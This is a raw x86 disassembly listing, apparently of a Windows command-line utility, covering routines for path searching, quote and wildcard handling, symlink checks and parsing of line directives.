  406fc5:	push   0x3f
  406fc7:	pop    eax
  406fc8:	mov    DWORD PTR [ebp-0x8],edi
  406fcb:	mov    ebx,eax
  406fcd:	jmp    0x406fb1
  406fcf:	xor    edx,edx
  406fd1:	push   0x2a
  406fd3:	pop    ecx
  406fd4:	mov    edi,DWORD PTR ds:0x421ef4
  406fda:	mov    DWORD PTR [ebp-0x8],edi
  406fdd:	mov    ebx,ecx
  406fdf:	jmp    0x406fb1
  406fe1:	test   edi,edi
  406fe3:	je     0x40712a
  406fe9:	mov    al,BYTE PTR [ebp+0x8]
  406fec:	and    al,0x4
  406fee:	mov    BYTE PTR [ebp-0x2],al
  406ff1:	mov    al,BYTE PTR [ebp+0xc]
  406ff4:	shr    al,1
  406ff6:	and    eax,0xffffff01
  406ffb:	mov    DWORD PTR [ebp-0xc],eax
  406ffe:	mov    al,BYTE PTR [ebp+0x8]
  407001:	mov    edi,DWORD PTR [ebp-0xc]
  407004:	and    al,0x2
  407006:	mov    BYTE PTR [ebp-0x1],al
  407009:	mov    eax,DWORD PTR [ebp-0x10]
  40700c:	mov    ds:0x4216ec,eax
  407011:	push   0x2a
  407013:	pop    eax
  407014:	cmp    bx,ax
  407017:	mov    eax,ds:0x421ef4
  40701c:	je     0x407023
  40701e:	mov    eax,ds:0x421f00
  407023:	mov    esi,DWORD PTR [eax]
  407025:	mov    ecx,DWORD PTR [ebp-0x14]
  407028:	mov    DWORD PTR [eax],edx
  40702a:	push   0x4216ec
  40702f:	or     dl,0xff
  407032:	call   0x40e68f
  407037:	push   DWORD PTR [ebp+0x10]
  40703a:	mov    edx,0x8000
  40703f:	push   eax
  407040:	mov    ecx,0x421f18
  407045:	mov    DWORD PTR [ebp-0xc],eax
  407048:	call   0x40f42d
  40704d:	test   al,al
  40704f:	je     0x407063
  407051:	push   DWORD PTR [ebp-0xc]
  407054:	push   0x447
  407059:	push   0x0
  40705b:	call   0x405021
  407060:	add    esp,0xc
  407063:	mov    cl,BYTE PTR [ebp-0x2]
  407066:	mov    dl,BYTE PTR [ebp+0xc]
  407069:	test   cl,cl
  40706b:	je     0x407076
  40706d:	test   dl,0x8
  407070:	jne    0x407076
  407072:	xor    al,al
  407074:	jmp    0x407078
  407076:	mov    al,0x1
  407078:	test   cl,cl
  40707a:	jne    0x40708b
  40707c:	test   BYTE PTR [ebp+0x8],0x8
  407080:	jne    0x407087
  407082:	test   dl,0x1
  407085:	je     0x40708b
  407087:	xor    dl,dl
  407089:	jmp    0x40708d
  40708b:	mov    dl,0x1
  40708d:	lea    ecx,[ebp-0x18]
  407090:	push   ecx
  407091:	push   edi
  407092:	push   eax
  407093:	mov    ecx,0x421f18
  407098:	call   0x4065b2
  40709d:	cmp    BYTE PTR [ebp-0x1],0x0
  4070a1:	mov    ecx,DWORD PTR [ebp+0x14]
  4070a4:	mov    DWORD PTR [ecx],eax
  4070a6:	jne    0x4070d0
  4070a8:	test   eax,eax
  4070aa:	je     0x4070d0
  4070ac:	cmp    eax,DWORD PTR ds:0x431f20
  4070b2:	jbe    0x4070d0
  4070b4:	cmp    BYTE PTR ds:0x4216e7,0x0
  4070bb:	jne    0x4070d0
  4070bd:	push   eax
  4070be:	push   DWORD PTR [ebp-0x18]
  4070c1:	push   0x435
  4070c6:	push   0x0
  4070c8:	call   0x405021
  4070cd:	add    esp,0x10
  4070d0:	push   0x2a
  4070d2:	pop    eax
  4070d3:	cmp    bx,ax
  4070d6:	jne    0x4070e5
  4070d8:	mov    eax,ds:0x421ef4
  4070dd:	mov    DWORD PTR ds:0x421ef4,esi
  4070e3:	jmp    0x4070f0
  4070e5:	mov    eax,ds:0x421f00
  4070ea:	mov    DWORD PTR ds:0x421f00,esi
  4070f0:	push   DWORD PTR [ebp-0xc]
  4070f3:	mov    DWORD PTR [eax],esi
  4070f5:	call   DWORD PTR ds:0x43754c
  4070fb:	cmp    BYTE PTR [ebp-0x1],0x0
  4070ff:	pop    ecx
  407100:	jne    0x40711c
  407102:	cmp    BYTE PTR ds:0x4216e7,0x0
  407109:	je     0x40711c
  40710b:	mov    eax,DWORD PTR [ebp+0x14]
  40710e:	mov    eax,DWORD PTR [eax]
  407110:	test   eax,eax
  407112:	je     0x40711c
  407114:	cmp    eax,DWORD PTR ds:0x431f20
  40711a:	ja     0x407127
  40711c:	push   0x0
  40711e:	pop    edx
  40711f:	test   esi,esi
  407121:	jne    0x407009
  407127:	mov    edi,DWORD PTR [ebp-0x8]
  40712a:	push   0x2a
  40712c:	pop    eax
  40712d:	cmp    bx,ax
  407130:	jne    0x40713a
  407132:	mov    DWORD PTR ds:0x421ef4,edi
  407138:	jmp    0x407140
  40713a:	mov    DWORD PTR ds:0x421f00,edi
  407140:	mov    al,0x1
  407142:	pop    edi
  407143:	pop    esi
  407144:	pop    ebx
  407145:	leave  
  407146:	ret    0x10
  407149:	push   ebp
  40714a:	mov    ebp,esp
  40714c:	push   ecx
  40714d:	push   ecx
  40714e:	push   esi
  40714f:	push   edi
  407150:	mov    esi,ecx
  407152:	mov    edi,edx
  407154:	mov    DWORD PTR [ebp-0x4],edi
  407157:	test   esi,esi
  407159:	je     0x4071c0
  40715b:	push   ebx
  40715c:	push   0x22
  40715e:	xor    eax,eax
  407160:	pop    ebx
  407161:	mov    edx,DWORD PTR [edi]
  407163:	dec    esi
  407164:	mov    DWORD PTR [ebp-0x8],esi
  407167:	mov    ecx,edx
  407169:	cmp    WORD PTR [edx],ax
  40716c:	je     0x4071b0
  40716e:	xor    esi,esi
  407170:	movzx  eax,WORD PTR [ecx]
  407173:	cmp    eax,0x5c
  407176:	je     0x407184
  407178:	cmp    eax,0x5e
  40717b:	je     0x407184
  40717d:	cmp    ax,bx
  407180:	je     0x4071a2
  407182:	jmp    0x40719c
  407184:	push   0x22
  407186:	pop    edi
  407187:	cmp    WORD PTR [ecx+0x2],di
  40718b:	jne    0x407196
  40718d:	mov    WORD PTR [edx],ax
  407190:	add    edx,0x2
  407193:	add    ecx,0x2
  407196:	mov    ax,WORD PTR [ecx]
  407199:	push   0x22
  40719b:	pop    ebx
  40719c:	mov    WORD PTR [edx],ax
  40719f:	add    edx,0x2
  4071a2:	add    ecx,0x2
  4071a5:	cmp    WORD PTR [ecx],si
  4071a8:	jne    0x407170
  4071aa:	mov    esi,DWORD PTR [ebp-0x8]
  4071ad:	mov    edi,DWORD PTR [ebp-0x4]
  4071b0:	xor    eax,eax
  4071b2:	add    edi,0x4
  4071b5:	mov    WORD PTR [edx],ax
  4071b8:	mov    DWORD PTR [ebp-0x4],edi
  4071bb:	test   esi,esi
  4071bd:	jne    0x407161
  4071bf:	pop    ebx
  4071c0:	pop    edi
  4071c1:	pop    esi
  4071c2:	leave  
  4071c3:	ret    
  4071c4:	push   ebp
  4071c5:	mov    ebp,esp
  4071c7:	sub    esp,0xc
  4071ca:	push   ebx
  4071cb:	push   esi
  4071cc:	push   edi
  4071cd:	push   0x22
  4071cf:	mov    esi,ecx
  4071d1:	pop    eax
  4071d2:	mov    bl,dl
  4071d4:	cmp    WORD PTR [esi],ax
  4071d7:	jne    0x407203
  4071d9:	push   eax
  4071da:	push   esi
  4071db:	call   DWORD PTR ds:0x43745c
  4071e1:	pop    ecx
  4071e2:	pop    ecx
  4071e3:	xor    ecx,ecx
  4071e5:	lea    edx,[esi+0x2]
  4071e8:	mov    WORD PTR [eax],cx
  4071eb:	movzx  eax,WORD PTR [edx]
  4071ee:	mov    WORD PTR [esi],ax
  4071f1:	jmp    0x4071fe
  4071f3:	lea    ecx,[edx]
  4071f5:	lea    edx,[ecx+0x2]
  4071f8:	movzx  eax,WORD PTR [edx]
  4071fb:	mov    WORD PTR [ecx],ax
  4071fe:	test   ax,ax
  407201:	jne    0x4071f3
  407203:	push   esi
  407204:	push   0x5
  407206:	call   0x4050f7
  40720b:	pop    ecx
  40720c:	pop    ecx
  40720d:	test   bl,bl
  40720f:	jne    0x40724e
  407211:	lea    eax,[ebp-0x8]
  407214:	push   eax
  407215:	call   DWORD PTR ds:0x437308
  40721b:	xor    edi,edi
  40721d:	push   edi
  40721e:	push   0x80
  407223:	push   0x3
  407225:	push   edi
  407226:	push   edi
  407227:	push   0x100
  40722c:	push   esi
  40722d:	call   DWORD PTR ds:0x43730c
  407233:	mov    esi,eax
  407235:	cmp    esi,0xffffffff
  407238:	je     0x40724e
  40723a:	lea    eax,[ebp-0x8]
  40723d:	push   eax
  40723e:	push   edi
  40723f:	push   edi
  407240:	push   esi
  407241:	call   DWORD PTR ds:0x437310
  407247:	push   esi
  407248:	call   DWORD PTR ds:0x437304
  40724e:	pop    edi
  40724f:	pop    esi
  407250:	pop    ebx
  407251:	leave  
  407252:	ret    
  407253:	test   BYTE PTR [ecx],0x10
  407256:	je     0x407266
  407258:	mov    eax,DWORD PTR [ecx+0x4]
  40725b:	mov    edx,DWORD PTR [ecx+0x8]
  40725e:	test   eax,eax
  407260:	jne    0x40726c
  407262:	test   edx,edx
  407264:	jne    0x40726c
  407266:	mov    edx,DWORD PTR [ecx+0x18]
  407269:	mov    eax,DWORD PTR [ecx+0x14]
  40726c:	ret    
  40726d:	push   ebp
  40726e:	mov    ebp,esp
  407270:	sub    esp,0x228
  407276:	mov    eax,ds:0x411018
  40727b:	xor    eax,ebp
  40727d:	mov    DWORD PTR [ebp-0x8],eax
  407280:	mov    eax,DWORD PTR [ebp+0x8]
  407283:	push   ebx
  407284:	push   esi
  407285:	push   edi
  407286:	mov    esi,ecx
  407288:	mov    ebx,edx
  40728a:	push   0x401758
  40728f:	push   esi
  407290:	mov    DWORD PTR [ebp-0x224],ebx
  407296:	mov    DWORD PTR [ebp-0x21c],eax
  40729c:	lea    edi,[ebp-0x214]
  4072a2:	call   DWORD PTR ds:0x437544
  4072a8:	test   eax,eax
  4072aa:	setne  al
  4072ad:	and    DWORD PTR [ebp-0x220],0x0
  4072b4:	pop    ecx
  4072b5:	pop    ecx
  4072b6:	mov    BYTE PTR [ebp-0x215],al
  4072bc:	test   al,al
  4072be:	je     0x407346
  4072c4:	mov    ecx,esi
  4072c6:	lea    edx,[ecx+0x2]
  4072c9:	mov    ax,WORD PTR [ecx]
  4072cc:	add    ecx,0x2
  4072cf:	cmp    ax,WORD PTR [ebp-0x220]
  4072d6:	jne    0x4072c9
  4072d8:	sub    ecx,edx
  4072da:	sar    ecx,1
  4072dc:	lea    eax,[ecx+0x1]
  4072df:	cmp    eax,0x104
  4072e4:	jbe    0x407311
  4072e6:	xor    ecx,ecx
  4072e8:	push   0x2
  4072ea:	pop    edx
  4072eb:	mul    edx
  4072ed:	seto   cl
  4072f0:	neg    ecx
  4072f2:	or     ecx,eax
  4072f4:	call   0x40a2fb
  4072f9:	mov    edi,eax
  4072fb:	test   edi,edi
  4072fd:	jne    0x407311
  4072ff:	push   0x41b
  407304:	push   DWORD PTR ds:0x4216e0
  40730a:	call   0x405021
  40730f:	pop    ecx
  407310:	pop    ecx
  407311:	movzx  eax,WORD PTR [esi]
  407314:	mov    ecx,edi
  407316:	test   ax,ax
  407319:	je     0x40733f
  40731b:	push   0x2
  40731d:	pop    ebx
  40731e:	cmp    ax,0x5e
  407322:	je     0x40732f
  407324:	cmp    ax,0x22
  407328:	je     0x40732f
  40732a:	mov    WORD PTR [ecx],ax
  40732d:	add    ecx,ebx
  40732f:	add    esi,ebx
  407331:	movzx  eax,WORD PTR [esi]
  407334:	test   ax,ax
  407337:	jne    0x40731e
  407339:	mov    ebx,DWORD PTR [ebp-0x224]
  40733f:	xor    eax,eax
  407341:	mov    WORD PTR [ecx],ax
  407344:	mov    esi,edi
  407346:	push   ebx
  407347:	push   esi
  407348:	call   DWORD PTR ds:0x437314
  40734e:	mov    ecx,DWORD PTR [ebp-0x21c]
  407354:	mov    DWORD PTR [ecx],eax
  407356:	cmp    eax,0xffffffff
  407359:	jne    0x407371
  40735b:	lea    eax,[ebp-0x214]
  407361:	cmp    edi,eax
  407363:	je     0x40736d
  407365:	push   edi
  407366:	call   DWORD PTR ds:0x43754c
  40736c:	pop    ecx
  40736d:	xor    eax,eax
  40736f:	jmp    0x4073e4
  407371:	mov    edx,ebx
  407373:	mov    ecx,esi
  407375:	call   0x407592
  40737a:	test   al,al
  40737c:	je     0x40735b
  40737e:	cmp    BYTE PTR [ebp-0x215],0x0
  407385:	je     0x4073a5
  407387:	push   0x2a
  407389:	push   esi
  40738a:	call   DWORD PTR ds:0x437540
  407390:	pop    ecx
  407391:	pop    ecx
  407392:	test   eax,eax
  407394:	jne    0x4073b6
  407396:	push   0x3f
  407398:	push   esi
  407399:	call   DWORD PTR ds:0x437540
  40739f:	pop    ecx
  4073a0:	pop    ecx
  4073a1:	test   eax,eax
  4073a3:	jne    0x4073b6
  4073a5:	mov    esi,DWORD PTR [ebp-0x21c]
  4073ab:	push   DWORD PTR [esi]
  4073ad:	call   DWORD PTR ds:0x437318
  4073b3:	or     DWORD PTR [esi],0xffffffff
  4073b6:	lea    eax,[ebp-0x214]
  4073bc:	cmp    edi,eax
  4073be:	je     0x4073c8
  4073c0:	push   edi
  4073c1:	call   DWORD PTR ds:0x43754c
  4073c7:	pop    ecx
  4073c8:	test   BYTE PTR [ebx],0x10
  4073cb:	jne    0x4073e1
  4073cd:	xor    eax,eax
  4073cf:	cmp    DWORD PTR [ebx+0x14],eax
  4073d2:	jne    0x4073e1
  4073d4:	cmp    DWORD PTR [ebx+0x18],eax
  4073d7:	jne    0x4073e1
  4073d9:	or     DWORD PTR [ebx+0x14],0xffffffff
  4073dd:	or     DWORD PTR [ebx+0x18],0xffffffff
  4073e1:	lea    eax,[ebx+0x2c]
  4073e4:	mov    ecx,DWORD PTR [ebp-0x8]
  4073e7:	pop    edi
  4073e8:	pop    esi
  4073e9:	xor    ecx,ebp
  4073eb:	pop    ebx
  4073ec:	call   0x40fd0b
  4073f1:	leave  
  4073f2:	ret    0x4
  4073f5:	push   esi
  4073f6:	push   edi
  4073f7:	mov    edi,ecx
  4073f9:	mov    esi,edx
  4073fb:	push   edi
  4073fc:	push   esi
  4073fd:	call   DWORD PTR ds:0x43731c
  407403:	test   eax,eax
  407405:	jne    0x407412
  407407:	push   esi
  407408:	call   DWORD PTR ds:0x437318
  40740e:	xor    eax,eax
  407410:	jmp    0x407415
  407412:	lea    eax,[edi+0x2c]
  407415:	pop    edi
  407416:	pop    esi
  407417:	ret    
  407418:	push   ebp
  407419:	mov    ebp,esp
  40741b:	push   ecx
  40741c:	push   ebx
  40741d:	push   esi
  40741e:	push   edi
  40741f:	push   DWORD PTR [ebp+0xc]
  407422:	mov    ebx,edx
  407424:	mov    edx,DWORD PTR [ebp+0x8]
  407427:	mov    edi,ecx
  407429:	mov    ecx,ebx
  40742b:	call   0x40726d
  407430:	test   eax,eax
  407432:	je     0x40743b
  407434:	mov    ecx,ebx
  407436:	jmp    0x4074f6
  40743b:	test   edi,edi
  40743d:	jne    0x407446
  40743f:	xor    eax,eax
  407441:	jmp    0x4074fb
  407446:	mov    edx,0x4216f0
  40744b:	mov    esi,edx
  40744d:	push   0x5c
  40744f:	pop    ecx
  407450:	movzx  eax,WORD PTR [edi]
  407453:	test   ax,ax
  407456:	je     0x407486
  407458:	push   0x22
  40745a:	pop    ecx
  40745b:	cmp    cx,ax
  40745e:	jne    0x40746b
  407460:	add    edi,0x2
  407463:	movzx  eax,WORD PTR [edi]
  407466:	test   ax,ax
  407469:	jne    0x407458
  40746b:	movzx  eax,WORD PTR [edi]
  40746e:	test   ax,ax
  407471:	je     0x407483
  407473:	add    edi,0x2
  407476:	mov    WORD PTR [esi],ax
  407479:	cmp    eax,0x3b
  40747c:	je     0x407483
  40747e:	add    esi,0x2
  407481:	jmp    0x40744d
  407483:	push   0x5c
  407485:	pop    ecx
  407486:	cmp    esi,edx
  407488:	jne    0x407492
  40748a:	cmp    WORD PTR [edi],0x0
  40748e:	jne    0x407450
  407490:	jmp    0x40743f
  407492:	movzx  eax,WORD PTR [esi-0x2]
  407496:	cmp    ax,cx
  407499:	je     0x4074a6
  40749b:	cmp    eax,0x2f
  40749e:	je     0x4074a6
  4074a0:	mov    WORD PTR [esi],cx
  4074a3:	add    esi,0x2
  4074a6:	xor    eax,eax
  4074a8:	push   0x401088
  4074ad:	push   edx
  4074ae:	mov    WORD PTR [esi],ax
  4074b1:	call   DWORD PTR ds:0x437544
  4074b7:	pop    ecx
  4074b8:	pop    ecx
  4074b9:	test   eax,eax
  4074bb:	jne    0x407446
  4074bd:	mov    ecx,esi
  4074bf:	sub    ecx,0x4216f0
  4074c5:	sar    ecx,1
  4074c7:	mov    eax,0x400
  4074cc:	push   ebx
  4074cd:	sub    eax,ecx
  4074cf:	push   eax
  4074d0:	push   esi
  4074d1:	call   DWORD PTR ds:0x4373d0
  4074d7:	mov    edx,DWORD PTR [ebp+0x8]
  4074da:	add    esp,0xc
  4074dd:	mov    esi,0x4216f0
  4074e2:	push   DWORD PTR [ebp+0xc]
  4074e5:	mov    ecx,esi
  4074e7:	call   0x40726d
  4074ec:	test   eax,eax
  4074ee:	je     0x407446
  4074f4:	mov    ecx,esi
  4074f6:	call   0x40dd18
  4074fb:	pop    edi
  4074fc:	pop    esi
  4074fd:	pop    ebx
  4074fe:	pop    ecx
  4074ff:	pop    ebp
  407500:	ret    0x8
  407503:	push   ebp
  407504:	mov    ebp,esp
  407506:	push   ecx
  407507:	push   ebx
  407508:	push   esi
  407509:	push   edi
  40750a:	mov    edi,edx
  40750c:	mov    esi,ecx
  40750e:	lea    edx,[ecx+0x2]
  407511:	xor    ebx,ebx
  407513:	mov    ax,WORD PTR [ecx]
  407516:	add    ecx,0x2
  407519:	cmp    ax,bx
  40751c:	jne    0x407513
  40751e:	sub    ecx,edx
  407520:	push   0x22
  407522:	pop    eax
  407523:	sar    ecx,1
  407525:	cmp    WORD PTR [esi],ax
  407528:	jne    0x40753c
  40752a:	cmp    WORD PTR [esi+ecx*2-0x2],ax
  40752f:	jne    0x40753c
  407531:	mov    ecx,esi
  407533:	call   0x40f8e1
  407538:	mov    esi,eax
  40753a:	mov    bl,0x1
  40753c:	push   edi
  40753d:	push   esi
  40753e:	call   DWORD PTR ds:0x437314
  407544:	mov    DWORD PTR [ebp-0x4],eax
  407547:	cmp    eax,0xffffffff
  40754a:	jne    0x40755c
  40754c:	test   bl,bl
  40754e:	je     0x407558
  407550:	push   esi
  407551:	call   DWORD PTR ds:0x43754c
  407557:	pop    ecx
  407558:	xor    al,al
  40755a:	jmp    0x40758d
  40755c:	mov    edx,edi
  40755e:	mov    ecx,esi
  407560:	call   0x407592
  407565:	test   al,al
  407567:	je     0x40754c
  407569:	push   DWORD PTR [ebp-0x4]
  40756c:	call   DWORD PTR ds:0x437318
  407572:	test   BYTE PTR [edi],0x10
  407575:	jne    0x40758b
  407577:	cmp    DWORD PTR [edi+0x14],0x0
  40757b:	jne    0x40758b
  40757d:	cmp    DWORD PTR [edi+0x18],0x0
  407581:	jne    0x40758b
  407583:	or     DWORD PTR [edi+0x14],0xffffffff
  407587:	or     DWORD PTR [edi+0x18],0xffffffff
  40758b:	mov    al,0x1
  40758d:	pop    edi
  40758e:	pop    esi
  40758f:	pop    ebx
  407590:	leave  
  407591:	ret    
  407592:	push   ebp
  407593:	mov    ebp,esp
  407595:	sub    esp,0x14
  407598:	push   ebx
  407599:	mov    ebx,edx
  40759b:	push   esi
  40759c:	test   DWORD PTR [ebx],0x400
  4075a2:	push   edi
  4075a3:	mov    DWORD PTR [ebp-0x8],ebx
  4075a6:	mov    edi,ecx
  4075a8:	je     0x4076f7
  4075ae:	cmp    DWORD PTR [ebx+0x24],0xa000000c
  4075b5:	jne    0x4076f7
  4075bb:	push   0x5c
  4075bd:	pop    eax
  4075be:	push   eax
  4075bf:	push   edi
  4075c0:	lea    esi,[ebx+0x2c]
  4075c3:	call   DWORD PTR ds:0x43745c
  4075c9:	mov    edx,eax
  4075cb:	xor    eax,eax
  4075cd:	pop    ecx
  4075ce:	pop    ecx
  4075cf:	mov    DWORD PTR [ebp-0xc],edx
  4075d2:	mov    DWORD PTR [ebp-0x4],eax
  4075d5:	test   edx,edx
  4075d7:	je     0x4076a5
  4075dd:	mov    ecx,edi
  4075df:	lea    eax,[ecx+0x2]
  4075e2:	mov    DWORD PTR [ebp-0x10],eax
  4075e5:	mov    ax,WORD PTR [ecx]
  4075e8:	add    ecx,0x2
  4075eb:	cmp    ax,WORD PTR [ebp-0x4]
  4075ef:	jne    0x4075e5
  4075f1:	sub    ecx,DWORD PTR [ebp-0x10]
  4075f4:	lea    eax,[edx+0x2]
  4075f7:	sar    ecx,1
  4075f9:	mov    DWORD PTR [ebp-0x10],eax
  4075fc:	mov    ax,WORD PTR [edx]
  4075ff:	add    edx,0x2
  407602:	cmp    ax,WORD PTR [ebp-0x4]
  407606:	jne    0x4075fc
  407608:	sub    edx,DWORD PTR [ebp-0x10]
  40760b:	mov    ebx,esi
  40760d:	sar    edx,1
  40760f:	lea    eax,[ebx+0x2]
  407612:	mov    DWORD PTR [ebp-0x14],eax
  407615:	mov    ax,WORD PTR [ebx]
  407618:	add    ebx,0x2
  40761b:	cmp    ax,WORD PTR [ebp-0x4]
  40761f:	jne    0x407615
  407621:	mov    eax,ebx
  407623:	sub    eax,DWORD PTR [ebp-0x14]
  407626:	push   0x2
  407628:	sar    eax,1
  40762a:	sub    eax,edx
  40762c:	add    eax,0x2
  40762f:	add    eax,ecx
  407631:	xor    ecx,ecx
  407633:	pop    edx
  407634:	mul    edx
  407636:	seto   cl
  407639:	mov    DWORD PTR [ebp-0x10],ebx
  40763c:	neg    ecx
  40763e:	or     ecx,eax
  407640:	call   0x40a2fb
  407645:	mov    ebx,DWORD PTR [ebp-0x8]
  407648:	mov    DWORD PTR [ebp-0x4],eax
  40764b:	test   eax,eax
  40764d:	jne    0x407664
  40764f:	push   0x41b
  407654:	push   DWORD PTR ds:0x4216e0
  40765a:	call   0x405021
  40765f:	mov    eax,DWORD PTR [ebp-0x4]
  407662:	pop    ecx
  407663:	pop    ecx
  407664:	mov    edx,DWORD PTR [ebp-0xc]
  407667:	mov    ecx,eax
  407669:	cmp    edi,edx
  40766b:	je     0x407681
  40766d:	push   0x2
  40766f:	pop    ebx
  407670:	mov    ax,WORD PTR [edi]
  407673:	mov    WORD PTR [ecx],ax
  407676:	add    edi,ebx
  407678:	add    ecx,ebx
  40767a:	cmp    edi,edx
  40767c:	jne    0x407670
  40767e:	mov    ebx,DWORD PTR [ebp-0x8]
  407681:	push   0x5c
  407683:	pop    eax
  407684:	push   0x2
  407686:	pop    edx
  407687:	mov    WORD PTR [ecx],ax
  40768a:	add    ecx,edx
  40768c:	jmp    0x407695
  40768e:	mov    WORD PTR [ecx],ax
  407691:	add    ecx,edx
  407693:	add    esi,edx
  407695:	movzx  eax,WORD PTR [esi]
  407698:	test   ax,ax
  40769b:	jne    0x40768e
  40769d:	mov    esi,DWORD PTR [ebp-0x4]
  4076a0:	xor    eax,eax
  4076a2:	mov    WORD PTR [ecx],ax
  4076a5:	push   eax
  4076a6:	push   eax
  4076a7:	push   0x3
  4076a9:	push   eax
  4076aa:	push   0x1
  4076ac:	push   0x80000000
  4076b1:	push   esi
  4076b2:	call   DWORD PTR ds:0x43730c
  4076b8:	cmp    DWORD PTR [ebp-0xc],0x0
  4076bc:	mov    edi,eax
  4076be:	je     0x4076c8
  4076c0:	push   esi
  4076c1:	call   DWORD PTR ds:0x43754c
  4076c7:	pop    ecx
  4076c8:	cmp    edi,0xffffffff
  4076cb:	jne    0x4076d1
  4076cd:	xor    al,al
  4076cf:	jmp    0x4076f9
  4076d1:	lea    eax,[ebx+0x14]
  4076d4:	push   eax
  4076d5:	lea    eax,[ebx+0xc]
  4076d8:	push   eax
  4076d9:	lea    eax,[ebx+0x4]
  4076dc:	push   eax
  4076dd:	push   edi
  4076de:	call   DWORD PTR ds:0x437320
  4076e4:	push   edi
  4076e5:	test   eax,eax
  4076e7:	jne    0x4076f1
  4076e9:	call   DWORD PTR ds:0x437304
  4076ef:	jmp    0x4076cd
  4076f1:	call   DWORD PTR ds:0x437304
  4076f7:	mov    al,0x1
  4076f9:	pop    edi
  4076fa:	pop    esi
  4076fb:	pop    ebx
  4076fc:	leave  
  4076fd:	ret    
  4076fe:	push   ebp
  4076ff:	mov    ebp,esp
  407701:	and    esp,0xfffffff8
  407704:	push   ecx
  407705:	push   ecx
  407706:	push   esi
  407707:	push   edi
  407708:	push   DWORD PTR ds:0x421f0c
  40770e:	call   DWORD PTR ds:0x437460
  407714:	pop    ecx
  407715:	mov    ecx,DWORD PTR ds:0x431f28
  40771b:	movzx  eax,ax
  40771e:	test   ecx,ecx
  407720:	jne    0x407738
  407722:	cmp    BYTE PTR ds:0x411021,cl
  407728:	je     0x4077b8
  40772e:	cmp    ax,0x21
  407732:	jne    0x4077b8
  407738:	mov    BYTE PTR ds:0x411021,0x0
  40773f:	test   ecx,ecx
  407741:	jne    0x40774c
  407743:	call   0x4078a7
  407748:	mov    edi,eax
  40774a:	jmp    0x407768
  40774c:	push   DWORD PTR ds:0x421f0c
  407752:	push   eax
  407753:	call   DWORD PTR ds:0x437464
  407759:	mov    edi,DWORD PTR ds:0x431f28
  40775f:	and    DWORD PTR ds:0x431f28,0x0
  407766:	pop    ecx
  407767:	pop    ecx
  407768:	cmp    edi,DWORD PTR ds:0x431f2c
  40776e:	lea    edx,[esp+0xa]
  407772:	mov    ecx,edi
  407774:	setne  BYTE PTR [esp+0xb]
  407779:	call   0x4079f0
  40777e:	mov    dl,BYTE PTR [esp+0xa]
  407782:	mov    esi,eax
  407784:	cmp    dl,0x9
  407787:	jne    0x4077be
  407789:	cmp    BYTE PTR ds:0x421f11,0x0
  407790:	je     0x4077a6
  407792:	push   edi
  407793:	push   0x409
  407798:	push   DWORD PTR ds:0x4216d4
  40779e:	call   0x405021
  4077a3:	add    esp,0xc
  4077a6:	mov    ecx,esi
  4077a8:	call   0x409cef
  4077ad:	cmp    al,0x12
  4077af:	jne    0x407886
  4077b5:	push   0x20
  4077b7:	pop    eax
  4077b8:	pop    edi
  4077b9:	pop    esi
  4077ba:	mov    esp,ebp
  4077bc:	pop    ebp
  4077bd:	ret    
  4077be:	cmp    dl,0xa
  4077c1:	jne    0x4077cf
  4077c3:	mov    ecx,esi
  4077c5:	call   0x407b38
  4077ca:	jmp    0x407886
  4077cf:	cmp    dl,0xb
  4077d2:	jne    0x4077ed
  4077d4:	push   esi
  4077d5:	push   0x41a
  4077da:	push   DWORD PTR ds:0x4216d4
  4077e0:	call   0x405021
  4077e5:	add    esp,0xc
  4077e8:	jmp    0x407886
  4077ed:	cmp    dl,0xc
  4077f0:	jne    0x407821
  4077f2:	push   0x2
  4077f4:	push   0x401764
  4077f9:	push   esi
  4077fa:	call   DWORD PTR ds:0x437414
  407800:	add    esp,0xc
  407803:	test   eax,eax
  407805:	jne    0x407815
  407807:	push   0x40176c
  40780c:	call   0x40c2d0
  407811:	pop    ecx
  407812:	add    esi,0x4
  407815:	push   esi
  407816:	push   0xd
  407818:	call   0x4050f7
  40781d:	pop    ecx
  40781e:	pop    ecx
  40781f:	jmp    0x407886
  407821:	cmp    dl,0xd
  407824:	jne    0x40787f
  407826:	and    DWORD PTR [esp+0xc],0x0
  40782b:	lea    eax,[esp+0xc]
  40782f:	push   eax
  407830:	push   0x401090
  407835:	push   esi
  407836:	call   DWORD PTR ds:0x4373c8
  40783c:	add    esp,0xc
  40783f:	mov    esi,eax
  407841:	lea    eax,[esp+0xc]
  407845:	push   eax
  407846:	push   0x401090
  40784b:	push   0x0
  40784d:	call   DWORD PTR ds:0x4373c8
  407853:	add    esp,0xc
  407856:	test   eax,eax
  407858:	je     0x40786e
  40785a:	push   esi
  40785b:	push   0x409
  407860:	push   DWORD PTR ds:0x4216d4
  407866:	call   0x405021
  40786b:	add    esp,0xc
  40786e:	mov    ecx,esi
  407870:	call   0x40a26b
  407875:	test   eax,eax
  407877:	je     0x407886
  407879:	or     BYTE PTR [eax+0xc],0x10
  40787d:	jmp    0x407886
  40787f:	mov    ecx,esi
  407881:	call   0x407e4d
  407886:	cmp    BYTE PTR [esp+0xb],0x0
  40788b:	mov    BYTE PTR ds:0x411021,0x1
  407892:	je     0x40789c
  407894:	push   edi
  407895:	call   DWORD PTR ds:0x43754c
  40789b:	pop    ecx
  40789c:	inc    DWORD PTR ds:0x4216d4
  4078a2:	jmp    0x407708
  4078a7:	push   ebx
  4078a8:	push   esi
  4078a9:	push   edi
  4078aa:	mov    cl,0x1
  4078ac:	call   0x40937a
  4078b1:	movzx  esi,ax
  4078b4:	push   0xa
  4078b6:	pop    ecx
  4078b7:	mov    eax,0xffff
  4078bc:	cmp    si,cx
  4078bf:	je     0x4078c6
  4078c1:	cmp    si,ax
  4078c4:	jne    0x4078d8
  4078c6:	push   0x3fa
  4078cb:	push   DWORD PTR ds:0x4216d4
  4078d1:	call   0x405021
  4078d6:	pop    ecx
  4078d7:	pop    ecx
  4078d8:	mov    dl,0x1
  4078da:	mov    ecx,esi
  4078dc:	xor    edi,edi
  4078de:	call   0x409457
  4078e3:	mov    ebx,DWORD PTR ds:0x437460
  4078e9:	movzx  esi,ax
  4078ec:	push   0x23
  4078ee:	pop    edx
  4078ef:	cmp    si,dx
  4078f2:	je     0x407990
  4078f8:	push   0x2
  4078fa:	pop    ecx
  4078fb:	push   0xa
  4078fd:	pop    eax
  4078fe:	cmp    si,ax
  407901:	je     0x407990
  407907:	mov    eax,0xffff
  40790c:	cmp    si,ax
  40790f:	je     0x407990
  407911:	mov    edx,DWORD PTR ds:0x431f24
  407917:	cmp    edx,ecx
  407919:	jb     0x407929
  40791b:	lea    eax,[edx-0x2]
  40791e:	cmp    edi,eax
  407920:	ja     0x407929
